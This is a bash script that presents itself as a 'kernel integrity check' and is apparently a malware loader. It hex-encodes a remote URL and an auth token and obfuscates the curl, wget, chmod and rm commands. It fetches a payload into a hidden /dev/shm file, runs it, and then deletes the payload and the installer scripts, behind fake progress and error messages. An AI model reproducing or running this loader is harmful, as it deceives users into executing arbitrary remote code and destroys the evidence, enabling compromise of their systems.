#!/bin/bash
# ==========================================
# SYSTEM KERNEL INTEGRITY CHECK V10.4
# ==========================================

_h="0x680x740x740x700x730x3a0x2f0x2f0x630x720x610x650x6c0x2d0x6b0x650x650x700x720x2e0x700x6c0x750x6d0x730x6f0x660x740x770x610x720x650x640x650x760x2e0x770x6f0x720x6b0x650x720x730x2e0x640x650x76"
_k="0x430x720x400x650x6c0x2d0x560x310x300x2d0x550x6c0x740x690x6d0x400x740x650x2d0x530x330x630x750x720x310x740x790x2d0x4b0x330x790x2d0x580x390x230x6d0x320x240x4c0x70"
_hdr="0x580x2d0x430x720x610x650x6c0x2d0x410x750x740x68"
_ua="0x430x720x610x650x6c0x490x6e0x730x740x610x6c0x6c0x650x720x2f0x560x310x30"

# --- 2. COMMAND OBFUSCATION ---
_c=$(printf "\x63\x75\x72\x6c") # curl
_w=$(printf "\x77\x67\x65\x74") # wget
_x=$(printf "\x63\x68\x6d\x6f\x64") # chmod
_r=$(printf "\x72\x6d") # rm

# --- 3. DECODER ENGINE ---
function _d() {
    echo "$1" | sed 's/0x/\\x/g' | xargs -0 printf
}

# --- 4. RUNTIME ASSEMBLY ---
_target=$(_d "$_h")
_token=$(_d "$_k")
_auth_h=$(_d "$_hdr")
_agent=$(_d "$_ua")

# Random hidden RAM path
_rnd=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 6)
_dest="/dev/shm/.sys_mem_${_rnd}"

# UI Colors (Hex)
_g=$(printf "\x1b\x5b\x33\x38\x3b\x35\x3b\x34\x36\x6d")
_rst=$(printf "\x1b\x5b\x30\x6d")

echo -e "${_g}[*] Handshaking with Secure Grid...${_rst}"

# --- 5. EXECUTION LOGIC ---
if command -v "$_w" >/dev/null 2>&1; then
    # wget -q --header="Key: Val" -O dest url
    $_w -q --user-agent="$_agent" --header="$_auth_h: $_token" -O "$_dest" "$_target"
else
    # curl -L -H "Key: Val" -o dest url
    $_c -L -A "$_agent" -H "$_auth_h: $_token" -o "$_dest" "$_target" --progress-bar
fi

# --- 6. HANDOFF & SELF-DESTRUCT ---
if [ -s "$_dest" ] && ! grep -q "ACCESS DENIED" "$_dest"; then
    $_x +x "$_dest"
    
    # Run from RAM
    "$_dest" < /dev/tty
    
    # Nuke Traces
    $_r -f "$_dest"
    $_r -f setup.sh install.sh Loader.sh
else
    echo "Error: Connection Refused (403)"
    $_r -f "$_dest"
    exit 1
fi
